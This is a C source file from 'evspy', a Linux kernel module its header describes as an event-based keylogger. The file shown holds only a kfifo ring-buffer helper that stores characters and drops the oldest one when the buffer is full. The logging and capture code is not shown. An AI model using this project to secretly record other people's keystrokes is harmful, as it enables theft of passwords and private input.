/*
 *   evspy - event based keylogger (Linux module)
 *
 *   Copyright (c) 2011 Guillermo Ramos <0xwille@gmail.com>
 *   based on evbug module by Vojtech Pavlik ((c) 1999-2001)
 *
 * This file is part of evspy
 *
 * evspy is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * evspy is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with evspy.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <linux/kfifo.h>
#include "cbuf.h"

DECLARE_KFIFO(cbuffer, char, CBUF_SIZE);

void cbuf_init(void)
{
	INIT_KFIFO(cbuffer);
}

int cbuf_read(char *to, int count, int *eof)
{
	int tmp = kfifo_len(&cbuffer);
	unsigned int n = min(tmp, count);	// TODO n = count?

	n = kfifo_out(&cbuffer, to, n);

	if (kfifo_is_empty(&cbuffer))
		*eof = 1;

	return n;
}

void cbuf_write(char c)
{
	/*
	 * The kfifo implementation doesn't allow to write in a full buffer, so if
	 * we want to do it anyway, we must first delete the last element
	 */
	if (kfifo_is_full(&cbuffer))
		kfifo_skip(&cbuffer);
	kfifo_put(&cbuffer, &c);
}
